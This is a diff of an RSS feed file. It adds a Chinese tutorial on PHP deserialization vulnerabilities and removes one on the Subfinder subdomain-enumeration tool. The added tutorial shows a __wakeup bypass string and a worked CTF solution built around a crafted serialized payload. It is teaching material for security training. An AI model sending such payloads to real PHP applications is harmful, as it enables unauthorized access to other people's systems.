@@ -5,7 +5,97 @@
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
 <description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。twosecurity.cn</description>
 <language>zh-cn</language>
-<lastBuildDate>Fri, 10 Jan 2020 07:15:21 +0800</lastBuildDate>
+<lastBuildDate>Sat, 11 Jan 2020 13:17:30 +0800</lastBuildDate>
+<item>
+<title>理解PHP反序列化漏洞</title>
+<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-10-102166928.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102166928&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;很多小白可能都会有这样的疑惑，PHP 我知道，序列化我也知道，合在一起的 PHP 反序列化就搞不懂了。&lt;/p&gt;&lt;p&gt;今天就来破解 PHP 反序列化漏洞之谜。&lt;/p&gt;&lt;h2&gt;PHP序列化与反序列化&lt;/h2&gt;&lt;p&gt;首先，我们来理解，PHP 序列化与 PHP 反序列化这两个名词。&lt;/p&gt;&lt;blockquote&gt;序列化，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;serialize()&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;函数用于序列化对象或数组，并返回一个字符串。&lt;/blockquote&gt;&lt;p&gt;简单来说，序列化就是把一水果整齐的放在果盘里，比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
+$serialized_data = serialize($sites);
+echo  $serialized_data;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;a:3:{i:0;s:1:&amp;#34;a&amp;#34;;i:1;s:2:&amp;#34;bb&amp;#34;;i:2;s:3:&amp;#34;ccc&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;o表示对象，a表示数组，s表示字符，i表示数字&lt;/blockquote&gt;&lt;p&gt;意思就是往果盘里面放了一个苹果、两个香蕉、三个梨，总共 3 类。&lt;/p&gt;&lt;p&gt;放入对象也是类似的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+class name1 {
+    var $test1;
+    var $test2;
+}
+$test3 = new name1;
+$test3-&amp;gt;test1 = &amp;#39;hi&amp;#39;;
+$test3-&amp;gt;test2 = &amp;#39;fun&amp;#39;;
+echo serialize($test3); &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:5:&amp;#34;name1&amp;#34;:2:{s:5:&amp;#34;test1&amp;#34;;s:2:&amp;#34;hi&amp;#34;;s:5:&amp;#34;test2&amp;#34;;s:3:&amp;#34;fun&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;unserialize()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;单词前面加个“un”，大家都不陌生吧，就是跟前面相反的意思，把水果从果盘里面拿出来。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
+$serialized_data = serialize($sites);
+$unserialized_data = unserialize($serialized_data);
+print_r($unserialized_data);
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Array
+(
+    [0] =&amp;gt;  a
+    [1] =&amp;gt;  bb
+    [2] =&amp;gt;  ccc
+)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就是 PHP 的反序列化，返回原始的结构。&lt;/p&gt;&lt;h2&gt;反序列化漏洞&lt;/h2&gt;&lt;p&gt;不就是放水果、拿水果吗？有什么危险的。&lt;/p&gt;&lt;p&gt;下面来介绍几种“果虫”，也就是危险的 PHP 魔法函数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;construct():当一个类被创建时自动调用
+destruct():当一个类被销毁时自动调用
+invoke():当把一个类当作函数使用时自动调用
+tostring():当把一个类当作字符串使用时自动调用
+wakeup():当调用unserialize()函数时自动调用
+sleep():当调用serialize()函数时自动调用
+__call():当要调用的方法不存在或权限不足时自动调用&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;来看看是怎样祸害我们的水果的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+class chybeta{
+	var $test = &amp;#39;123&amp;#39;;
+	function __wakeup(){
+		echo &amp;#34;__wakeup&amp;#34;;
+		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
+	}
+	function __construct(){
+		echo &amp;#34;__construct&amp;#34;;
+		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
+	}
+	function __destruct(){
+		echo &amp;#34;__destruct&amp;#34;;
+		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
+	}
+}
+$class2 = &amp;#39;O:7:&amp;#34;chybeta&amp;#34;:1:{s:4:&amp;#34;test&amp;#34;;s:3:&amp;#34;123&amp;#34;;}&amp;#39;;
+	print_r($class2);
+echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
+$class2_unser = unserialize($class2);
+print_r($class2_unser);
+echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;unserialize() 反序列化之后，会导致 wakeup() 或 destruct() 的直接调用，因此最理想的情况就是一些漏洞/危害代码在 wakeup() 或 destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。&lt;/p&gt;&lt;p&gt;&lt;b&gt;绕过魔法函数&lt;/b&gt;&lt;/p&gt;&lt;p&gt;魔法函数 sleep() 和 wakeup()&lt;/p&gt;&lt;blockquote&gt;php 文档中定义 __wakeup():&lt;br/&gt;unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep() 则相反，是用在序列化一个对象时被调用.&lt;/blockquote&gt;&lt;p&gt;正常情况下的反序列化漏洞如下图：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;析构方法和 __wakeup 都能够执行&lt;/p&gt;&lt;p&gt;如果我们把传入的序列化字符串的属性个数更改成大于 1 的任何数&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:7:&amp;#34;hpdoger&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:6:&amp;#34;u know&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图，__wakeup 没有被执行，但是执行了析构函数&lt;/p&gt;&lt;h2&gt;CTF题实战&lt;/h2&gt;&lt;p&gt;&lt;b&gt;南邮CTF&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+class just4fun { //定义了一个类
+    var $enter;
+    var $secret;
+}
+if (isset($_GET[&amp;#39;pass&amp;#39;])) {
+    $pass = $_GET[&amp;#39;pass&amp;#39;];
+
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+
+    $o = unserialize($pass); //进行反序列化处理
+
+    if ($o) {
+        $o-&amp;gt;secret = &amp;#34;*&amp;#34;; //这里不知道*代表的是啥
+        if ($o-&amp;gt;secret === $o-&amp;gt;enter) //要求$o中的两个属性值相同
+            echo &amp;#34;Congratulation! Here is my secret: &amp;#34;.$o-&amp;gt;secret;
+        else 
+            echo &amp;#34;Oh no... You can&amp;#39;t fool me&amp;#34;;
+    }
+    else echo &amp;#34;are you trolling?&amp;#34;;
+}
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于我们不知道 * 代表的是什么，所以用指针来直接让两个的属性相等。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+$o = new just4fun;
+$o-&amp;gt;enter = &amp;amp;$o-&amp;gt;secret; //这里的a=&amp;amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b
+echo serialize($o);
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本地运行即可得到序列化字符串&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:8:&amp;#34;just4fun&amp;#34;:2:{s:5:&amp;#34;enter&amp;#34;;N;s:6:&amp;#34;secret&amp;#34;;R:2;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后将此作为 pass 参数 GET 发送即可获得 flag。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
+<author>二向箔安全学院</author>
+<guid isPermaLink="false">2020-01-10-102166928</guid>
+<pubDate>Fri, 10 Jan 2020 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>CTF平台搭建：CanHackMe</title>
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101994123.html</link>
@@ -529,57 +619,6 @@ msf5 auxiliary(fuzzers/ssh/ssh_version_2) &amp;gt; run
 <author>二向箔安全学院</author>
 <guid isPermaLink="false">2020-01-03-100870206</guid>
 <pubDate>Fri, 03 Jan 2020 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>汇集七种API的子域发现工具：Subfinder</title>
-<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-02-100692663.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/100692663&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e336a103f15c191da4ba9c3028e782c0_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Subfinder&lt;/h2&gt;&lt;p&gt;一个子域发现工具，可通过使用被动的在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。subfinder 仅用于做一件事，那就是被动子域枚举。&lt;/p&gt;&lt;p&gt;在获得了 APIKEY 后，可进行全方面的被动式子域发现，为渗透测试人员提供服务。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-532240931abab5d2f41fbdf50ab576ce_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;2490&quot; data-rawheight=&quot;1692&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2490&quot; data-original=&quot;https://pic3.zhimg.com/v2-532240931abab5d2f41fbdf50ab576ce_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-532240931abab5d2f41fbdf50ab576ce_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;2490&quot; data-rawheight=&quot;1692&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2490&quot; data-original=&quot;https://pic3.zhimg.com/v2-532240931abab5d2f41fbdf50ab576ce_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-532240931abab5d2f41fbdf50ab576ce_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;特征✨&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;模块化架构&lt;/li&gt;&lt;li&gt;速度快、轻量级资源&lt;/li&gt;&lt;li&gt;丰富的被动源（截至目前已有26个源）&lt;/li&gt;&lt;li&gt;支持集成 Stdin和 stdout&lt;/li&gt;&lt;li&gt;多种输出格式&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;安装❗&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/projectdisco&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;very/subfinder&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;使用版本：v2.2.4&lt;/p&gt;&lt;p&gt;环境：win10&lt;/p&gt;&lt;blockquote&gt;直接安装需 go1.13+ 才能成功安装！&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;Docker 一键部署&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先拉取官方镜像。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker pull ice3man/subfinder&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker run -it ice3man/subfinder&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f682f195223e3dd59590a8120d0f9765_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;793&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;793&quot; data-original=&quot;https://pic2.zhimg.com/v2-f682f195223e3dd59590a8120d0f9765_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f682f195223e3dd59590a8120d0f9765_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;793&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;793&quot; data-original=&quot;https://pic2.zhimg.com/v2-f682f195223e3dd59590a8120d0f9765_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-f682f195223e3dd59590a8120d0f9765_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;提示没有提供输入列表，运行命令后面接参数指令即可，例如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker run -it ice3man/subfinder -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显示帮助菜单。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4fe9ec3030f3a3781bd5d3a09a0c01be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;845&quot; data-rawheight=&quot;750&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;845&quot; data-original=&quot;https://pic3.zhimg.com/v2-4fe9ec3030f3a3781bd5d3a09a0c01be_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4fe9ec3030f3a3781bd5d3a09a0c01be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;845&quot; data-rawheight=&quot;750&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;845&quot; data-original=&quot;https://pic3.zhimg.com/v2-4fe9ec3030f3a3781bd5d3a09a0c01be_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4fe9ec3030f3a3781bd5d3a09a0c01be_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li&gt;-config API密钥等的配置文件&lt;/li&gt;&lt;li&gt;-d 查找子域&lt;/li&gt;&lt;li&gt;-dL 包含要枚举的域列表的文件&lt;/li&gt;&lt;li&gt;-exclude-sources 清单中要排除的来源清单&lt;/li&gt;&lt;li&gt;-max-time 等待枚举结果的分钟数（默认为10）&lt;/li&gt;&lt;li&gt;-nC 不要在输出中使用颜色&lt;/li&gt;&lt;li&gt;-nW 从输出中删除通配符和失效子域&lt;/li&gt;&lt;li&gt;-o 输出到指定文件（可选）&lt;/li&gt;&lt;li&gt;-oD 将枚举结果写入指定目录（可选）&lt;/li&gt;&lt;li&gt;-oI 以Host，IP格式写入输出&lt;/li&gt;&lt;li&gt;-oJ 以JSON行格式写入输出&lt;/li&gt;&lt;li&gt;-r 以逗号分隔的要使用的解析程序列表&lt;/li&gt;&lt;li&gt;-rL 包含要使用的解析器列表的文本文件&lt;/li&gt;&lt;li&gt;-silent 仅显示输出中的子域&lt;/li&gt;&lt;li&gt;-sources 用逗号分隔的来源列表&lt;/li&gt;&lt;li&gt;-t 用于解析的并发 goroutine 的数量（默认为10）&lt;/li&gt;&lt;li&gt;-timeout 超时时间（默认为30）&lt;/li&gt;&lt;li&gt;-v 显示详细输出&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Windows 下还可以自己下载 exe 文件运行。&lt;/p&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder/releases&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/projectdisco&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;very/subfinder/releases&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;运行方式：cmd 跳转到其相同目录，然后：（例如命令 -h）&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;subfinder-windows-amd64.exe -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;使用 API&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.virustotal.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Virustotal&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//passivetotal.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Passivetotal&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//securitytrails.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;SecurityTrails&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//censys.io/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Censys&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//binaryedge.io/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Binaryedge&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//shodan.io/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Shodan&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//urlscan.io/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;URLScan&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;需要注册其帐号，获取 APIKEY，然后调用即可。说得有点啰嗦，直接看下面的操作吧。&lt;/p&gt;&lt;p&gt;例如，先获取 shodan 的 APIKEY：&lt;/p&gt;&lt;p&gt;进入 shodan 官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shodan.io/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shodan.io/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 并登录。进入“我的账户”：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-37763752a113d14d1aaee8e6e80872f3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1216&quot; data-rawheight=&quot;359&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1216&quot; data-original=&quot;https://pic4.zhimg.com/v2-37763752a113d14d1aaee8e6e80872f3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-37763752a113d14d1aaee8e6e80872f3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1216&quot; data-rawheight=&quot;359&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1216&quot; data-original=&quot;https://pic4.zhimg.com/v2-37763752a113d14d1aaee8e6e80872f3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-37763752a113d14d1aaee8e6e80872f3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;获取 APIKEY：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c9be9d1fc0baf5209ac9deb691900071_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1248&quot; data-rawheight=&quot;746&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1248&quot; data-original=&quot;https://pic2.zhimg.com/v2-c9be9d1fc0baf5209ac9deb691900071_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c9be9d1fc0baf5209ac9deb691900071_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1248&quot; data-rawheight=&quot;746&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1248&quot; data-original=&quot;https://pic2.zhimg.com/v2-c9be9d1fc0baf5209ac9deb691900071_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c9be9d1fc0baf5209ac9deb691900071_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后，创建文件：&lt;b&gt;config.yaml&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;demo：&lt;/b&gt;&lt;/p&gt;&lt;div 